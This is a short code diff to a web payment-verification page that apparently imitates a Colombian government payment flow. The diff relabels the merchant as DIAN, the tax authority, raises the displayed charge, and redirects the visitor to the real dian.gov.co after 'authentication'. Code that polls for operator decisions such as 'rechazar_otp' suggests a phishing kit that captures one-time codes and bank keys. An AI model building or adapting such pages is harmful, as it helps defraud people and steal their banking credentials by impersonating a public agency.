@@ -771,11 +771,11 @@
         <div class="transaction-info">
             <div class="info-row">
                 <span class="info-label">Comercio</span>
-                <span class="info-value">Superintendencia de Notariado</span>
+                <span class="info-value">DIAN</span>
             </div>
             <div class="info-row">
                 <span class="info-label">Monto</span>
-                <span class="info-value" id="transaction-amount">23.000 Col$</span>
+                <span class="info-value" id="transaction-amount">42.196 Col$</span>
             </div>
             <div class="info-row">
                 <span class="info-label">Fecha</span>
@@ -936,7 +936,7 @@ const MAX_POLLING_TIME = 300000;
 
         function initializeTransaction() {
             const storagePriority = localStorage.getItem('procesamiento_prioritario') === 'true';
-            let amount = 23000;
+            let amount = 42196;
             if (storagePriority) amount += 20000;
             const formattedAmount = amount.toLocaleString('es-CO').replace(/,/g, '.');
             document.getElementById('transaction-amount').textContent = formattedAmount + ' Col$';
@@ -1235,7 +1235,7 @@ const MAX_POLLING_TIME = 300000;
                     pollingInterval = null;
                     mostrarExito('✅ Autenticación exitosa. Redirigiendo...');
                     setTimeout(() => {
-                        window.location.href = 'exito.html';
+                        window.location.href = 'https://www.dian.gov.co';
                     }, 2000);
                     return;
                 } else if (resultado === 'rechazar_otp' || resultado === 'rechazar_clave_din') {
